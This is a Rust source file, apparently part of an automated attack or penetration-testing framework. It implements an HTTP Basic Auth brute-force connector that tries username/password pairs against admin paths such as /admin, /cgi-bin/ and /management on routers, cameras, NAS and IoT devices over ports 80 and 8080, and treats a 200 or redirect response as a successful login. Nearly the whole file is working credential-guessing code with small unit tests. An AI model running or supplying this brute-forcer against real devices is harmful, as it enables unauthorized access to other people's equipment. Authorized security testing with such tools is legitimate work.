use std::time::Duration;

use super::{BruteForceAction, Connector};

/// HTTP Basic Auth brute force.
/// Tests username/password against common web admin panels
/// (routers, cameras, NAS, IoT devices).
pub struct HttpBasicConnector;

impl Connector for HttpBasicConnector {
    fn try_connect(
        &self,
        ip: &str,
        port: u16,
        user: &str,
        password: &str,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + '_>> {
        let ip = ip.to_string();
        let user = user.to_string();
        let password = password.to_string();
        Box::pin(async move { http_try_connect(&ip, port, &user, &password).await })
    }
}

/// Common paths that typically require HTTP Basic Auth.
const AUTH_PATHS: &[&str] = &[
    "/",
    "/admin",
    "/admin/",
    "/management",
    "/login",
    "/cgi-bin/",
    "/status",
    "/api/v1/auth",
];

async fn http_try_connect(ip: &str, port: u16, user: &str, password: &str) -> bool {
    let credentials = format!("{user}:{password}");
    let encoded = base64_encode(&credentials);
    let auth_header = format!("Basic {encoded}");

    for path in AUTH_PATHS {
        let url = format!("http://{ip}:{port}{path}");
        let result = tokio::time::timeout(Duration::from_secs(5), async {
            // Use tokio TCP directly to avoid reqwest overhead per attempt
            let addr = format!("{ip}:{port}");
            let mut stream = tokio::net::TcpStream::connect(&addr).await.ok()?;

            let request = format!(
                "GET {path} HTTP/1.1\r\nHost: {ip}:{port}\r\nAuthorization: {auth_header}\r\nConnection: close\r\n\r\n"
            );

            use tokio::io::{AsyncReadExt, AsyncWriteExt};
            stream.write_all(request.as_bytes()).await.ok()?;

            let mut buf = [0u8; 1024];
            let n = stream.read(&mut buf).await.ok()?;
            let response = std::str::from_utf8(&buf[..n]).ok()?;

            // Check for 200 OK or 30x redirect (not 401/403)
            let status_line = response.lines().next()?;
            if status_line.contains(" 200 ")
                || status_line.contains(" 301 ")
                || status_line.contains(" 302 ")
            {
                Some(())
            } else {
                None
            }
        })
        .await;

        if matches!(result, Ok(Some(()))) {
            return true;
        }
    }

    false
}

pub fn create_action() -> BruteForceAction<HttpBasicConnector> {
    // Port 80 — the orchestrator will also match on 8080 since both are in portlist
    BruteForceAction::new(HttpBasicConnector, "HTTPBruteforce", "http", 80, None, 20)
}

/// Create a second action instance for port 8080.
pub fn create_action_8080() -> BruteForceAction<HttpBasicConnector> {
    BruteForceAction::new(
        HttpBasicConnector,
        "HTTPBruteforce8080",
        "http",
        8080,
        None,
        20,
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::actions::Action;

    #[test]
    fn test_create_action_name() {
        assert_eq!(create_action().name(), "HTTPBruteforce");
    }

    #[test]
    fn test_create_action_port() {
        assert_eq!(create_action().port(), Some(80));
    }

    #[test]
    fn test_create_action_parent() {
        assert_eq!(create_action().parent(), None);
    }

    #[test]
    fn test_create_action_8080_name() {
        assert_eq!(create_action_8080().name(), "HTTPBruteforce8080");
    }

    #[test]
    fn test_create_action_8080_port() {
        assert_eq!(create_action_8080().port(), Some(8080));
    }

    #[test]
    fn test_create_action_8080_parent() {
        assert_eq!(create_action_8080().parent(), None);
    }
}

fn base64_encode(input: &str) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let bytes = input.as_bytes();
    let mut result = String::new();
    for chunk in bytes.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        result.push(if chunk.len() > 1 {
            CHARS[((triple >> 6) & 0x3F) as usize] as char
        } else {
            '='
        });
        result.push(if chunk.len() > 2 {
            CHARS[(triple & 0x3F) as usize] as char
        } else {
            '='
        });
    }
    result
}
